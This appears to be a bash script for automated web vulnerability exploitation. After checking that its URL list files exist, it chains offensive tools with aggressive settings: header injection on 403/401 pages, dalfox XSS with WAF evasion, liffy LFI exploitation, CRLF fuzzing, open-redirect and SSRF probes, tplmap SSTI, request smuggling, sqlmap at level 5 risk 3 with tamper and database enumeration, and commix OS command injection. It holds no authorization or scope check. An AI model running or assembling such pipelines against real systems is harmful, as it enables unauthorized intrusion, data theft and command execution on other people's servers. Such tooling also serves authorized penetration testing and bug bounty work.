#!/bin/bash
# Need to change the SSRF tool

# Define the directory to check and the list of required files
directory="."
required_files=("httpx.txt" "XSS.txt" "LFI.txt" "ALLWithout404.txt" "SSRF.txt" "SSTI.txt" "SQL.txt" "OS_Commands.txt")

# Array to store missing files
missing_files=()

# Check if each required file exists in the directory
for file in "${required_files[@]}"; do
    if [ ! -f "$directory/$file" ]; then
        missing_files+=("$file")
    fi
done

# Check if any files are missing
if [ ${#missing_files[@]} -eq 0 ]; then
    echo "ok"
    # head injection for 403&401
    cat httpx.txt | grep "403" | anew 403.txt
    cat httpx.txt | grep "401" | anew 403.txt
    cat 403.txt | while read url; do headi -u $url -p internal_CLoudEnum_IPs.txt | anew 403_Response.txt ; done
    
    # XSS injection
    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0' -o XSS_Inject_Response.txt;
    sleep 3
    
    # LFI injection
    
    # cat LFI.txt | qsreplace FUZZ | while read url; do
    # ffuf -u $url -t 25 -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt | anew LFI_new_Response.txt
    # done
    
    cd liffy
    cat LFI.txt | while read url; do python3 liffy.py $url -d -i -e -f | anew ../LFI_new_Response.txt; done
    cd ../
    sleep 3
    
    # CRLF injection
    crlfuzz -l ALLWithout404.txt -c 20 | anew CRLF_Inject_Response.txt
    sleep 3
    
    # Open Redirect
    cd Oralyzer
    python3 oralyzer.py -l SSRF.txt | anew ../Open_Redirect_Response.txt
    cd ../
    sleep 3
    
    # SSRF injection
    cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url; do httpx -t 30 -rl 100 -u $url --status-code -o SSRF_Inject_Response.txt | anew SSRF_Inject_anew_Response.txt; done
    sleep 3
    
    # SSTI injection
    cd tplmap
    cat SSTI.txt | while read url; do python3 tplmap.py -u $url | anew ../SSTI_Inject_Response.txt; done
    cd ../
    sleep 3
    
    # Smuggler injection
    cd smuggler
    cat ALLWithout404.txt | python3 smuggler.py | anew Smuggler_Response.txt
    cd ../
    sleep 3
    
    # SQL injection
    sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
    sleep 3
    
    
    # OS command injection
    cd commix
    cat OS_Commands.txt | while read url; do python3 commix.py -u $url --hostname | anew ../Command_Inject_Response.txt; done
    cd ../
else
    echo "Missing files:"
    printf '%s\n' "${missing_files[@]}"
fi
